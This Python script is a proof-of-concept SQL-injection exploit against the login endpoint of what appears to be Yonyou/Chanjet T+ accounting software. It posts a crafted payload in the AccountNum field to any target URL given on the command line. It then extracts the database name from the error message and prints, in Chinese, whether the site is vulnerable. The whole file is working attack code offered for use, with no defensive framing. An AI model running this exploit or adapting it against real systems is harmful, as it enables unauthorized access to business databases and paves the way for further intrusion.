#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec

import requests
import urllib3
import sys
import time
import json
import re
from datetime import datetime, timedelta

urllib3.disable_warnings()

def verify(site):
    burp0_url = site + "/tplus/ajaxpro/Ufida.T.SM.Login.UIP.LoginManager,Ufida.T.SM.Login.UIP.ashx?method=CheckPassword"
    burp0_headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9,ru;q=0.8", "Cache-Control": "no-cache", "Connection": "keep-alive", "Content-Type": "application/json", "Origin": site, "Pragma": "no-cache", "Referer": site + "/tplus/ajaxpro/Ufida.T.SM.Login.UIP.LoginManager,Ufida.T.SM.Login.UIP.ashx?method=CheckPassword", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"}
    burp0_json= {
  "AccountNum":"-6357 OR 8290 IN (SELECT DB_NAME())",
  "UserName":"admin",
  "Password":"e10adc3949ba59abbe56e057f20f883e",
  "rdpYear":"2022",
  "rdpMonth":"2",
  "rdpDate":"21",
  "webServiceProcessID":"admin",
  "ali_csessionid":"",
  "ali_sig":"",
  "ali_token":"",
  "ali_scene":"",
  "role":"",
  "aqdKey":"",
  "formWhere":"browser",
  "cardNo":""
}

    r = requests.post(burp0_url, headers=burp0_headers, json=burp0_json, verify=False)
    if "nvarchar" in r.text:
        patt = "'([^']+)'"

        dbname = re.findall(patt, r.json()["error"]["Message"], re.I)
        if len(dbname) != 0:
            return dbname[0]
    return ""

if __name__=="__main__":
    target = sys.argv[1]
    info = verify(target)
    if info != "":
        print("[+]漏洞存在，获取数据库名称为：", info)
    else:
        print("[-]漏洞不存在") 
